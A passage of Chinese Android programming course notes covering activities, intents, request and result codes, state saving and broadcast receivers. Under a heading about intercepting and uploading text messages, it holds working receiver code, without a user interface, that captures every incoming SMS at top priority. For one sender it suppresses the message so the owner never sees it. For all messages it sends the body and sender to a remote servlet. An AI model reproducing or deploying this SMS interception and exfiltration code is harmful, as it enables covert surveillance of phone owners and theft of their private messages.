                file.close();

                System.out.println(
"线程"
 
+
 threadid 
+
 
"下载完毕"
);

                
// 当线程下载完毕后 把文件删除掉

                
if
 (postionfile.exists()) {

                    postionfile.delete();

                }

            } 
catch
 (Exception e) {

                e.printStackTrace();

            }

            
super
.run();

        }

    }

    
public
 String getFilenName(String path) {

        
int
 start 
=
 path.lastIndexOf(
"/"
) 
+
 
1
;

        
return
 path.substring(start, path.length());

    }

}
===============anr       应用程序无响应（ANR：Application Not Responding） 异常问题======================


public
 
class
 AnrActivity 
extends
 Activity {

    
/** Called when the activity is first created. */

    @Override

    
public
 
void
 onCreate(Bundle savedInstanceState) {

        
super
.onCreate(savedInstanceState);

        setContentView(R.layout.main);

    }

    

    

    
public
 
void
 click(View view){

        
// 让主线程睡眠6秒钟 

  
      // 主线程阻塞的时间 超过 6秒钟 , 

        // anr的异常 

        // 主线程要完成一些界面的更新 事件的处理 窗体显示的回调

        

        

        
// 
所有耗时的操作,我们都需要放到子线程里面运行 

        
// 子线程执行完毕后 ,发送消息给主线程 让主线程更新界面 

        
//1. 访问网络的操作.  2.大文件的拷贝   3.阻塞式的请求 

        

        
try
 {

            System.out.println(
"sleep 10 s"
);

            
Thread.sleep(10000);

        } 
catch
 (InterruptedException e) {

            e.printStackTrace();

        }

    }

}


======================Activity===========================
public class Demo1Activity extends Activity {     /** Called when the activity is first created. */     @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);     }               public void open(View view){     	// intent 意图 , 描述一个动作, 激活一个组件      /*	第一种写法       * Intent intent = new Intent();     	intent.setClassName("cn.itcast.mutileactivity", "cn.itcast.mutileactivity.Demo2Activity");*/      // 第二种写法       //	Intent intent = new Intent(this,Demo2Activity.class);         /*          *第三种写法      	Intent intent = new Intent();     	ComponentName  component = new ComponentName("cn.itcast.mutileactivity", "cn.itcast.mutileactivity.Demo2Activity");     	intent.setComponent(component);     	*/     	//前面的三种写法 要求必须要知道 被激活的组件的包名和 class的名字      	//显示意图        	//**************************************************** //    	Intent intent = new Intent(); //    	intent.setAction("cn.itcast.mutileactivity.xxx"); //    	intent.addCategory("android.xxx"); //    	intent.setData(Uri.parse("itcast://cn.itcast.demo")); //    	intent.setType(type);  // mime 数据类型 image/jpeg      	// 隐式意图  Android系统会根据隐式意图中设置的动作(action)、类别(category)、数据（URI和数据类型）找到最合适的组件来处理这个意图。     	// 只需要指定 intent的动作 ,intent的数据       	// 如果我们想激活另外一个应用程序的组件  //    	Intent intent = new Intent(); //    	intent.setAction(Intent.ACTION_PICK); //选择图片的意图 //     //    	intent.setType("image/jpeg");         	// intent 要去做一件事  泡 动作 泡茶 泡咖啡 泡妞 打人  打酱油      	// intent.setData();指定数据的类型 type      	// intent.addCategory();     	/**     	 *    <intent-filter>                 <action android:name="android.intent.action.VIEW" />                 <category android:name="android.intent.category.DEFAULT" />                 <data android:mimeType="vnd.android-dir/mms-sms" />             </intent-filter>     	 */ /*    	Intent intent = new Intent();     	intent.setAction(Intent.ACTION_VIEW);     	intent.addCategory("android.intent.category.DEFAULT");     	intent.setType("vnd.android-dir/mms-sms");*/     	/**           <activity             android:label="@string/activity02"             android:name=".Demo2Activity" ><intent-filter >                 <action android:name="cn.itcast.mutileactivity.Demo2Activity" />                 <action android:name="cn.itcast.mutileactivity.xxx" />                 <category android:name="android.intent.category.DEFAULT" />                 <category android:name="android.xxx" />             </intent-filter>         </activity>      	 */         	Intent intent = new Intent();     	intent.setAction("android.intent.action.SENDTO");     	intent.addCategory("android.intent.category.DEFAULT");     	intent.setData(Uri.parse("smsto:123456"));     	startActivity(intent);     } }

76
 
1
public
 
class
 
Demo1Activity
 
extends
 
Activity
 {
2
    
/** Called when the activity is first created. */
3
    
@Override
4
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
5
        
super
.
onCreate
(
savedInstanceState
);
6
        
setContentView
(
R
.
layout
.
main
);
7
    }
8
    
9
    
10
    
public
 
void
 
open
(
View
 
view
){
11
    
    
// intent 意图 , 描述一个动作, 激活一个组件 
12
    
/*
  
第一种写法 
13
     
* Intent intent = new Intent();
14
    
    
intent.setClassName("cn.itcast.mutileactivity", "cn.itcast.mutileactivity.Demo2Activity");*/
15
     
// 第二种写法 
16
     
//
 
Intent intent = new Intent(this,Demo2Activity.class);
17
        
/*
18
         
*第三种写法 
19
    
    
Intent intent = new Intent();
20
    
    
ComponentName  component = new ComponentName("cn.itcast.mutileactivity", "cn.itcast.mutileactivity.Demo2Activity");
21
    
    
intent.setComponent(component);
22
    
    
*/
23
    
    
//前面的三种写法 要求必须要知道 被激活的组件的包名和 class的名字 
24
    
    
//显示意图 
25
    
    
26
    
    
27
    
    
//****************************************************
28
//    
  
Intent intent = new Intent();
29
//    
  
intent.setAction("cn.itcast.mutileactivity.xxx");
30
//    
  
intent.addCategory("android.xxx");
31
//    
  
intent.setData(Uri.parse("itcast://cn.itcast.demo"));
32
//    
  
intent.setType(type);  // mime 数据类型 image/jpeg
33
    
    
34
    
    
// 隐式意图  Android系统会根据隐式意图中设置的动作(action)、类别(category)、数据（URI和数据类型）找到最合适的组件来处理这个意图。
35
    
    
// 只需要指定 intent的动作 ,intent的数据  
36
    
    
// 如果我们想激活另外一个应用程序的组件 
37
//    
  
Intent intent = new Intent();
38
//    
  
intent.setAction(Intent.ACTION_PICK); //选择图片的意图
39
//    
  
40
//    
  
intent.setType("image/jpeg");
41
    
    
42
    
    
// intent 要去做一件事  泡 动作 泡茶 泡咖啡 泡妞 打人  打酱油 
43
    
    
// intent.setData();指定数据的类型 type 
44
    
    
// intent.addCategory();
45
    
    
/**
46
    
    
 
*    <intent-filter>
47
                
<action android:name="android.intent.action.VIEW" />
48
                
<category android:name="android.intent.category.DEFAULT" />
49
                
<data android:mimeType="vnd.android-dir/mms-sms" />
50
            
</intent-filter>
51
    
    
 
*/
52
/*    
  
Intent intent = new Intent();
53
    
    
intent.setAction(Intent.ACTION_VIEW);
54
    
    
intent.addCategory("android.intent.category.DEFAULT");
55
    
    
intent.setType("vnd.android-dir/mms-sms");*/
56
    
    
/**
57
 
58
        
<activity
59
            
android:label="@string/activity02"
60
            
android:name=".Demo2Activity" ><intent-filter >
61
                
<action android:name="cn.itcast.mutileactivity.Demo2Activity" />
62
                
<action android:name="cn.itcast.mutileactivity.xxx" />
63
                
<category android:name="android.intent.category.DEFAULT" />
64
                
<category android:name="android.xxx" />
65
            
</intent-filter>
66
        
</activity>
67
68
    
    
 
*/
69
    
    
70
    
    
Intent
 
intent
 
=
 
new
 
Intent
();
71
    
    
intent
.
setAction
(
"android.intent.action.SENDTO"
);
72
    
    
intent
.
addCategory
(
"android.intent.category.DEFAULT"
);
73
    
    
intent
.
setData
(
Uri
.
parse
(
"smsto:123456"
));
74
    
    
startActivity
(
intent
);
75
    }
76
}
public void click(View view){     	EditText et = (EditText) this.findViewById(R.id.et_activity01);     	String content = et.getText().toString().trim();         	Intent intent = new Intent(this,Demo2Activity.class);     	// intent.putExtra("cn.itcast.passdata.name", content);     	//基本数据类型 和基本数据类型的数组 我们都可以通过intent传递         	Bundle bundle = new Bundle();     	bundle.putString("cn.itcast.passdata.name", content);       	intent.putExtras(bundle);     	startActivity(intent);     }      public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main2);                  //获取到激活他的意图         Intent intent = getIntent();        // String name = intent.getStringExtra("cn.itcast.passdata.name");          Bundle bundle =  intent.getExtras();          String name =  bundle.getString("cn.itcast.passdata.name");                   TextView tv  =(TextView) this.findViewById(R.id.tv_activity02);          tv.setText("你好 :"+name);     }

26
 
1
 
public
 
void
 
click
(
View
 
view
){
2
    
    
EditText
 
et
 
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_activity01
);
3
    
    
String
 
content
 
=
 
et
.
getText
().
toString
().
trim
();
4
    
    
5
    
    
Intent
 
intent
 
=
 
new
 
Intent
(
this
,
Demo2Activity
.
class
);
6
    
    
// intent.putExtra("cn.itcast.passdata.name", content);
7
    
    
//基本数据类型 和基本数据类型的数组 我们都可以通过intent传递     
    
8
    
    
Bundle
 
bundle
 
=
 
new
 
Bundle
();
9
    
    
bundle
.
putString
(
"cn.itcast.passdata.name"
, 
content
);   
    
10
    
    
intent
.
putExtras
(
bundle
);
   
11
    
    
startActivity
(
intent
);
12
    }
13
14
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
15
        
super
.
onCreate
(
savedInstanceState
);
16
        
setContentView
(
R
.
layout
.
main2
);
17
        
18
        
//获取到激活他的意图
19
        
Intent
 
intent
 
=
 
getIntent
();
20
       
// String name = intent.getStringExtra("cn.itcast.passdata.name");
21
         
Bundle
 
bundle
 
=
  
intent
.
getExtras
();
22
         
String
 
name
 
=
  
bundle
.
getString
(
"cn.itcast.passdata.name"
);
23
        
24
         
TextView
 
tv
  
=
(
TextView
) 
this
.
findViewById
(
R
.
id
.
tv_activity02
);
25
         
tv
.
setText
(
"你好 :"
+
name
);
26
    }
==============第二个向第一个传递数据=============
public void click(View view) { Intent intent = new Intent(this, ContactActivity.class); // startActivity(intent); startActivityForResult(intent, 1);  //第二个参数就是requestCode,用于区分是哪一个点击的行为 }  public void click2(View view) { Intent intent = new Intent(this, ContactActivity.class); // startActivity(intent); startActivityForResult(intent, 2); } /** * 当被激活的activity（第二个activity） 使用完毕 销毁的时候 就会执行onActivityresult的方法 */ @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { // TODO Auto-generated method stub  System.out.println("结果码为"+ resultCode); super.onActivityResult(requestCode, resultCode, data);  if (data != null) { String name = data.getStringExtra("name"); if (requestCode == 1) {  et.setText(name); }else if(requestCode == 2){ et2.setText(name); }  } }  lv.setOnItemClickListener(new OnItemClickListener() { @Override public void onItemClick(AdapterView<?> parent, View view, int position, long id) { TextView tv = (TextView) view; String name = tv.getText().toString(); Intent data = new Intent(); data.putExtra("name", name); setResult(3, data);//简单的数据可直接用此返回，比如状态码 // 可以把当前的activity给结束掉  finish(); } });

47
 
1
    
2
public
 
void
 
click
(
View
 
view
) {
3
    
    
Intent
 
intent
 
=
 
new
 
Intent
(
this
, 
ContactActivity
.
class
);
4
    
    
// startActivity(intent);
5
    
    
startActivityForResult
(
intent
, 
1
);  
//第二个参数就是requestCode,用于区分是哪一个点击的行为
6
    
}
7
8
    
public
 
void
 
click2
(
View
 
view
) {
9
    
    
Intent
 
intent
 
=
 
new
 
Intent
(
this
, 
ContactActivity
.
class
);
10
    
    
// startActivity(intent);
11
    
    
startActivityForResult
(
intent
, 
2
);
12
    
}
13
/**
14
    
 
* 当被激活的activity（第二个activity） 使用完毕 销毁的时候 就会执行onActivityresult的方法
15
    
 
*/
16
    
@Override
17
    
protected
 
void
 
onActivityResult
(
int
 
requestCode
, 
int
 
resultCode
, 
Intent
 
data
) {
18
    
    
// TODO Auto-generated method stub
19
    
    
20
    
    
System
.
out
.
println
(
"结果码为"
+
 
resultCode
);
21
    
    
super
.
onActivityResult
(
requestCode
, 
resultCode
, 
data
);
22
23
    
    
if
 (
data
 
!=
 
null
) {
24
    
    
    
String
 
name
 
=
 
data
.
getStringExtra
(
"name"
);
25
    
    
    
if
 (
requestCode
 
==
 
1
) {  
26
27
    
    
    
    
et
.
setText
(
name
);
28
    
    
    
}
else
 
if
(
requestCode
 
==
 
2
){
29
    
    
    
    
et2
.
setText
(
name
);
30
    
    
    
}
31
    
    
    
32
    
    
}
33
    
}
34
35
    
    
lv
.
setOnItemClickListener
(
new
 
OnItemClickListener
() {
36
    
    
    
@Override
37
    
    
    
public
 
void
 
onItemClick
(
AdapterView
<?>
 
parent
, 
View
 
view
,
38
    
    
    
    
    
int
 
position
, 
long
 
id
) {
39
    
    
    
    
TextView
 
tv
 
=
 (
TextView
) 
view
;
40
    
    
    
    
String
 
name
 
=
 
tv
.
getText
().
toString
();
41
    
    
    
    
Intent
 
data
 
=
 
new
 
Intent
();
42
    
    
    
    
data
.
putExtra
(
"name"
, 
name
);
43
    
    
    
    
setResult
(
3
, 
data
);
//简单的数据可直接用此返回，比如状态码
44
    
    
    
    
// 可以把当前的activity给结束掉 
45
    
    
    
    
finish
();
46
    
    
    
}
47
    
    
});
多个页面之间的标识作用
===============请求码的作用  多----->一   ===================
使用startActivityForResult(Intent intent, int requestCode)方法打开新的Activity，我们需要为startActivityForResult()方法传入一个请求码(第二个参数)。请求码的值是根据业务需要由自已设定，用于标识请求来源。例如：一个Activity有两个按钮，点击这两个按钮都会打开同一个Activity，不管是那个按钮打开新Activity，当这个新Activity关闭后，系统都会调用前面Activity的onActivityResult(int requestCode, int resultCode, Intent data)方法。在onActivityResult()方法如果需要知道新Activity是由那个按钮打开的，并且要做出相应的业务处理，这时可以这样做：
 @Override  public void onCreate(Bundle savedInstanceState) {
        ....
        button1.setOnClickListener(new View.OnClickListener(){
 public void onClick(View v) {
  startActivityForResult (new Intent(MainActivity.this, NewActivity.class), 1);
  }});
        button2.setOnClickListener(new View.OnClickListener(){
 public void onClick(View v) {
  startActivityForResult (new Intent(MainActivity.this, NewActivity.class), 2);
  }}); 
       @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) {
               switch(requestCode){
                   case 1:
                       //来自按钮1的请求，作相应业务处理
                   case 2:
               //来自按钮2的请求，作相应业务处理
                }
          }
}
================结果码   一 --->多   ===========
在一个Activity中，可能会使用startActivityForResult()方法打开多个不同的Activity处理不同的业务，当这些新Activity关闭后，系统都会调用前面Activity的onActivityResult(int requestCode, int resultCode, Intent data)方法。为了知道返回的数据来自于哪个新Activity，在onActivityResult()方法中可以这样做(ResultActivity和NewActivity为要打开的新Activity)：
public class ResultActivity extends Activity {
       .....
       ResultActivity.this.setResult(1, intent);
       ResultActivity.this.finish();
}
public class NewActivity extends Activity {
       ......
        NewActivity.this.setResult(2, intent);
        NewActivity.this.finish();
}
public class MainActivity extends Activity { // 在该Activity会打开ResultActivity和NewActivity
       @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) {
               switch(resultCode){
                   case 1:
                       // ResultActivity的返回数据
                   case 2:
              // NewActivity的返回数据
                }
          }
}




=======================得到新打开Activity 关闭后返回的数据===================

1.----------前一个界面
如果你想在Activity中得到新打开Activity 关闭后返回的数据，你需要使用系统提供的 startActivityForResult (Intent intent, int requestCode)方法打开新的Activity，新的Activity 关闭后会向前面的Activity 传回数据，为了得到传回的数据，你必须在前面的Activity中重写 onActivityResult (int requestCode, int resultCode, Intent data)方法：
public class MainActivity extends Activity {
      @Override protected void onCreate(Bundle savedInstanceState) {
.......
Button button =(Button) this.findViewById(R.id.button);
                           button.setOnClickListener(new View.OnClickListener(){//点击该按钮会打开一个新的Activity
public void onClick(View v) {
//第二个参数为请求码，可以根据业务需求自己编号
startActivityForResult (new Intent(MainActivity.this, NewActivity.class),  1);
}});
         }


    //第一个参数为请求码，即调用startActivityForResult()传递过去的值
    //第二个参数为结果码，结果码用于标识返回数据来自哪个新Activity
   @Override protected void onActivityResult (int requestCode, int resultCode, Intent data) {
String result = data.getExtras().getString(“result”));//得到新Activity 关闭后返回的数据
    }
}    当新Activity关闭后，新Activity返回的数据通过Intent进行传递，android平台会调用前面Activity 的onActivityResult()方法，把存放了返回数据的Intent作为第三个输入参数传入，在onActivityResult()方法中使用第三个输入参数可以取出新Activity返回的数据。
2.-------------后一个界面
使用startActivityForResult(Intent intent, int requestCode)方法打开新的Activity，新Activity关闭前需要向前面的Activity返回数据需要使用系统提供的 setResult (int resultCode , Intent data)方法实现：
public class NewActivity extends Activity {
@Override protected void onCreate(Bundle savedInstanceState) {
......
       button.setOnClickListener(new View.OnClickListener(){
public void onClick(View v) {
Intent intent = new Intent();//数据是使用Intent返回
intent.putExtra(“result”, “传智播客的学生很可爱”);//把返回数据存入Intent
NewActivity.this. setResult (RESULT_OK, intent);//设置返回数据
NewActivity.this.finish();//关闭Activity
}});
}
}
setResult()方法的第一个参数值可以根据业务需要自己定义，上面代码中使用到的RESULT_OK是系统Activity类定义的一个常量，值为-1，代码片断如下：
public class android.app.Activity extends ......{
  public static final int RESULT_CANCELED = 0;
  public static final int RESULT_OK = -1;
  public static final int RESULT_FIRST_USER = 1;
}
========================================
        <activity 
            android:configChanges="keyboardHidden|orientation"
            android:theme="@android:style/Theme.Dialog"  //对话框的样式
            android:name=".Dmeo2Activity">
</activity>


默认情况下，当“屏幕方向”或“键盘显示隐藏” 变化时都会销毁当前Activity，创建新的Activity。如果不希望重新创建Activity实例，可以按如下配置Activity：
<activity android:name=".MainActivity" android:configChanges="keyboardHidden|orientation">
上面的android:configChanges属性指定了要捕获“屏幕方向”和“键盘显示隐藏”变化，当捕获到这些变化后会调用Activity的onConfigurationChanged()方法。


/** * activity第一次被创建的时候 执行的方法 */     @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);         int page = 0;         //pdf 阅读器  当前用户读到了第30页          if(savedInstanceState!=null){         	page = savedInstanceState.getInt("page");         	System.out.println("定位到 第 "+ page+"页");         }                  System.out.println("oncreate");     }            /**      * 在activity被异常 回收的时候 会被执行       */     @Override protected void onSaveInstanceState(Bundle outState) {  super.onSaveInstanceState(outState); outState.putInt("page", 30); }

27
 
1
2
    
/**
3
    
 
* activity第一次被创建的时候 执行的方法
4
    
 
*/
5
    
@Override
6
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
7
        
super
.
onCreate
(
savedInstanceState
);
8
        
setContentView
(
R
.
layout
.
main
);
9
        
int
 
page
 
=
 
0
;
10
        
//pdf 阅读器  当前用户读到了第30页 
11
        
if
(
savedInstanceState
!=
null
){
12
        
    
page
 
=
 
savedInstanceState
.
getInt
(
"page"
);
13
        
    
System
.
out
.
println
(
"定位到 第 "
+
 
page
+
"页"
);
14
        }
15
        
16
        
System
.
out
.
println
(
"oncreate"
);
17
    }  
18
    
19
    
/**
20
     
* 在activity被异常 回收的时候 会被执行 
21
     
*/
22
    
@Override
23
    
protected
 
void
 
onSaveInstanceState
(
Bundle
 
outState
) {
24
    
    
25
    
    
super
.
onSaveInstanceState
(
outState
);
26
    
    
outState
.
putInt
(
"page"
, 
30
);
27
    
}


===============================广播接收者-- BroadcastReceiver ================
1.清单文件里注册
----------------------------------窃听短信并上传----------------------------------------
广播被分为两种不同的类型： “普通广播（Normal broadcasts）”和“有序广播（Ordered broadcasts）” 。普通广播是完全异步的，可以在同一时刻（逻辑上）被所有接收者接收到，消息传递的效率比较高，但缺点是：接收者不能将处理结果传递给下一个接收者，并且无法终止广播Intent的传播；然而有序广播是按照接收者声明的优先级别，被接收者依次接收广播。如：A的级别高于B,B的级别高于C,那么，广播先传给A，再传给B，最后传给C 。优先级别声明在intent-filter元素的android:priority属性中，数越大优先级别越高,取值范围:-1000到1000，优先级别也可以调用IntentFilter对象的setPriority()进行设置 。有序广播的接收者 可以终止广播Intent的传播， 广播Intent的传播一旦终止，后面的接收者就无法接收到广播。另外，有序广播的接收者可以将数据传递给下一个接收者，如：A得到广播后，可以往它的结果对象中存入数据，当广播传给B时,B可以从A的结果对象中得到A存入的数据。


Context. sendBroadcast()
   发送的是普通广播，所有订阅者都有机会获得并进行处理。


Context. sendOrderedBroadcast()
   发送的是有序广播，系统会根据接收者声明的优先级别按顺序逐个执行接收者，前面的接收者有权终止广播(BroadcastReceiver.abortBroadcast())，如果广播被前面的接收者终止，后面的接收者就再也无法获取到广播。对于有序广播，前面的接收者可以将数据通过 setResultExtras (Bundle)方法存放进结果对象，然后传给下一个接收者，下一个接收者通过代码：Bundle bundle = getResultExtras (true))可以获取上一个接收者存入在结果对象中的数据。


系统收到短信 ，发出的广播属于有序广播。如果想阻止用户收到短信，可以通过设置优先级，让你们自定义的接收者先获取到广播，然后终止广播，这样用户就接收不到短信了。
广播接收者（BroadcastReceiver）用于接收广播Intent，广播Intent的发送是通过调用Context.sendBroadcast()、Context.sendOrderedBroadcast()来实现的。通常一个广播Intent可以被订阅了此Intent的多个广播接收者所接收，这个特性跟JMS中的Topic消息接收者类似。要实现一个广播接收者方法如下： 第一步：继承BroadcastReceiver，并重写onReceive()方法。 public class IncomingSMSReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { } } 第二步：订阅感兴趣的广播Intent，订阅方法有两种： 第一种：使用代码进行订阅 IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED"); IncomingSMSReceiver receiver = new IncomingSMSReceiver(); registerReceiver(receiver, filter); 第二种：在AndroidManifest.xml文件中的<application>节点里进行订阅: <receiver android:name=".IncomingSMSReceiver"> <intent-filter> <action android:name="android.provider.Telephony.SMS_RECEIVED"/> </intent-filter> </receiver>        <application         android:icon="@drawable/ic_launcher"         android:label="@string/app_name" >         <receiver              android:name=".SmsReceiver"             >           <intent-filter android:priority="1000"> //设置接受的优先级，优先级高的话可以截获，然后处理（比如删除，更改），默认是0               <action android:name="android.provider.Telephony.SMS_RECEIVED"/>   当此action发生的时候receiver会接收，会接收到一个关于短信的intent，其中带有 各种信息           </intent-filter>           </receiver>     </application>     <uses-permission android:name="android.permission.RECEIVE_SMS"/><!-- 接收短信权限 -->     <uses-permission android:name="android.permission.SEND_SMS"/><!-- 发送短信权限 -->

34
 
1
广播接收者（BroadcastReceiver）用于接收广播Intent，广播Intent的发送是通过调用Context.sendBroadcast()、Context.sendOrderedBroadcast()来实现的。通常一个广播Intent可以被订阅了此Intent的多个广播接收者所接收，这个特性跟JMS中的Topic消息接收者类似。要实现一个广播接收者方法如下：
2
第一步：继承BroadcastReceiver，并重写onReceive()方法。
3
public class IncomingSMSReceiver extends BroadcastReceiver {
4
    
@Override public void onReceive(Context context, Intent intent) {
5
    
}
6
}
7
第二步：订阅感兴趣的广播Intent，订阅方法有两种：
8
第一种：使用代码进行订阅
9
IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
10
IncomingSMSReceiver receiver = new IncomingSMSReceiver();
11
registerReceiver(receiver, filter);
12
第二种：在AndroidManifest.xml文件中的
<
application
>
节点里进行订阅:
13
<
receiver
 
android:name
=
".IncomingSMSReceiver"
>
14
    
<
intent-filter
>
15
         
<
action
 
android:name
=
"android.provider.Telephony.SMS_RECEIVED"
/>
16
    
</
intent-filter
>
17
</
receiver
>
18
19
20
21
    
<
application
22
        
android:icon
=
"@drawable/ic_launcher"
23
        
android:label
=
"@string/app_name"
 
>
24
        
<
receiver
 
25
            
android:name
=
".SmsReceiver"
26
            
>
27
          
<
intent-filter
 
android:priority
=
"1000"
>
 //设置接受的优先级，优先级高的话可以截获，然后处理（比如删除，更改），默认是0
28
              
<
action
 
android:name
=
"android.provider.Telephony.SMS_RECEIVED"
/>
   当此action发生的时候receiver会接收，会接收到一个关于短信的intent，其中带有 各种信息
29
          
</
intent-filter
>
   
30
        
</
receiver
>
31
    
</
application
>
32
    
<
uses-permission
 
android:name
=
"android.permission.RECEIVE_SMS"
/>
<!-- 接收短信权限 -->
33
    
<
uses-permission
 
android:name
=
"android.permission.SEND_SMS"
/>
<!-- 发送短信权限 -->
34
public class SmsReceiver extends BroadcastReceiver {   //这个程序是没有界面的  // 当接受到短信的时候   // android.provider.Telephony.SMS_RECEIVED @Override public void onReceive(Context context, Intent intent) {  // 阻塞时间超过10秒 很容易anr 异常  System.out.println("thread name ="+Thread.currentThread().getName());   // intent 存放的有接收到的短信的内容  Object[] pdus =  (Object[]) intent.getExtras().get("pdus"); for(Object pdu:pdus){  SmsMessage message  = SmsMessage.createFromPdu((byte[])pdu); // 获取短信的正文内容  final String content = message.getMessageBody(); //获取短信的发送者 final String address = message.getOriginatingAddress(); System.out.println(content); System.out.println(address); // 把收到短信的系统的广播事件给结束    if("15555215556".equals(address)){ abortBroadcast();  SmsManager manager = SmsManager.getDefault(); manager.sendTextMessage(address, null, "ni qu siba ,wo yijing xihuan le xxx", null, null); }  // 因为广播接受者的生命周期非常的端 ,广播接受者所在的进程很有可能会别系统回收  // 子线程也会被销毁.  // service    new Thread(){//  @Override public void run() { String path ="http://192.168.1.247:8080/web/SmsServlet?address="+address+"&content="+content; try { URL url = new URL(path); HttpURLConnection conn = (HttpURLConnection) url.openConnection(); conn.setRequestMethod("GET"); conn.setConnectTimeout(5000); System.out.println(conn.getResponseCode()); } catch (Exception e) { // TODO Auto-generated catch block e.printStackTrace(); } super.run(); }    }.start();  } } }

57
 
1
public
 
class
 
SmsReceiver
 
extends
 
BroadcastReceiver
 {   
//这个程序是没有界面的
2
3
    
// 当接受到短信的时候  
4
    
// android.provider.Telephony.SMS_RECEIVED
5
    
@Override
6
    
public
 
void
 
onReceive
(
Context
 
context
, 
Intent
 
intent
) {
7
    
    
8
    
    
// 阻塞时间超过10秒 很容易anr 异常 
9
    
    
System
.
out
.
println
(
"thread name ="
+
Thread
.
currentThread
().
getName
());
10
    
    
11
    
    
12
    
    
// intent 存放的有接收到的短信的内容 
13
    
    
Object
[] 
pdus
 
=
  (
Object
[]) 
intent
.
getExtras
().
get
(
"pdus"
);
14
    
    
for
(
Object
 
pdu
:
pdus
){
15
    
    
    
16
    
    
    
SmsMessage
 
message
  
=
 
SmsMessage
.
createFromPdu
((
byte
[])
pdu
);
17
    
    
    
// 获取短信的正文内容 
18
    
    
    
final
 
String
 
content
 
=
 
message
.
getMessageBody
();
19
    
    
    
//获取短信的发送者
20
    
    
    
final
 
String
 
address
 
=
 
message
.
getOriginatingAddress
();
21
    
    
    
System
.
out
.
println
(
content
);
22
    
    
    
System
.
out
.
println
(
address
);
23
    
    
    
// 把收到短信的系统的广播事件给结束 
24
    
    
    
25
    
    
    
26
    
    
    
if
(
"15555215556"
.
equals
(
address
)){
27
    
    
    
    
abortBroadcast
();
28
    
    
    
    
29
    
    
    
    
SmsManager
 
manager
 
=
 
SmsManager
.
getDefault
();
30
    
    
    
    
manager
.
sendTextMessage
(
address
, 
null
, 
"ni qu siba ,wo yijing xihuan le xxx"
, 
null
, 
null
);
31
    
    
    
}
32
    
    
    
33
    
    
    
// 因为广播接受者的生命周期非常的端 ,广播接受者所在的进程很有可能会别系统回收 
34
    
    
    
// 子线程也会被销毁. 
35
    
    
    
// service
36
    
    
    
new
 
Thread
(){
//
37
38
    
    
    
    
@Override
39
    
    
    
    
public
 
void
 
run
() {
40
    
    
    
    
    
String
 
path
 
=
"http://192.168.1.247:8080/web/SmsServlet?address="
+
address
+
"&content="
+
content
;
41
    
    
    
    
    
try
 {
42
    
    
    
    
    
    
URL
 
url
 
=
 
new
 
URL
(
path
);
43
    
    
    
    
    
    
HttpURLConnection
 
conn
 
=
 (
HttpURLConnection
) 
url
.
openConnection
();
44
    
    
    
    
    
    
conn
.
setRequestMethod
(
"GET"
);
45
    
    
    
    
    
    
conn
.
setConnectTimeout
(
5000
);
46
    
    
    
    
    
    
System
.
out
.
println
(
conn
.
getResponseCode
());
47
    
    
    
    
    
} 
catch
 (
Exception
 
e
) {
48
    
    
    
    
    
    
// TODO Auto-generated catch block
49
    
    
    
    
    
    
e
.
printStackTrace
();
50
    
    
    
    
    
}
51
    
    
    
    
    
super
.
run
();
52
    
    
    
    
}
53
    
    
    }.
start
();
54
    
    
    
55
    
    
}
56
    
}
57
}
2.代码里面注册
public class SmslistenercodeActivity extends Activity {     /** Called when the activity is first created. */     @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);     }          public void register(View view){     	IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");     	SmsReceiver receiver = new SmsReceiver();     	registerReceiver(receiver, filter);     }          class SmsReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { System.out.println("接收到了广播");  }          } }

23
 
1
public
 
class
 
SmslistenercodeActivity
 
extends
 
Activity
 {
2
    
/** Called when the activity is first created. */
3
    
@Override
4
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
5
        
super
.
onCreate
(
savedInstanceState
);
6
        
setContentView
(
R
.
layout
.
main
);
7
    }
8
    
9
    
public
 
void
 
register
(
View
 
view
){
10
    
    
IntentFilter
 
filter
 
=
 
new
 
IntentFilter
(
"android.provider.Telephony.SMS_RECEIVED"
);
11
    
    
SmsReceiver
 
receiver
 
=
 
new
 
SmsReceiver
();
12
    
    
registerReceiver
(
receiver
, 
filter
);
13
    }
14
    
15
    
class
 
SmsReceiver
 
extends
 
BroadcastReceiver
 {
16
    
    
@Override
17
    
    
public
 
void
 
onReceive
(
Context
 
context
, 
Intent
 
intent
) {
18
    
    
    
System
.
out
.
println
(
"接收到了广播"
);
19
    
    
    
20
    
    
}
21
    
22
    }
23
}
除了短信到来广播Intent，Android还有很多广播Intent，如：开机启动、电池电量变化、时间已经改变等广播Intent。
 接收电池电量变化广播Intent ，在AndroidManifest.xml文件中的<application>节点里订阅此Intent:
<receiver android:name=".IncomingSMSReceiver">
    <intent-filter>
         <action android:name="android.intent.action.BATTERY_CHANGED"/>
    </intent-filter>
</receiver>


 接收开机启动广播Intent，在AndroidManifest.xml文件中的<application>节点里订阅此Intent:
<receiver android:name=".IncomingSMSReceiver">
    <intent-filter>
         <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
</receiver>
并且要进行权限声明：
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>


 =============对拨打电话的号码就有拦截的功能================
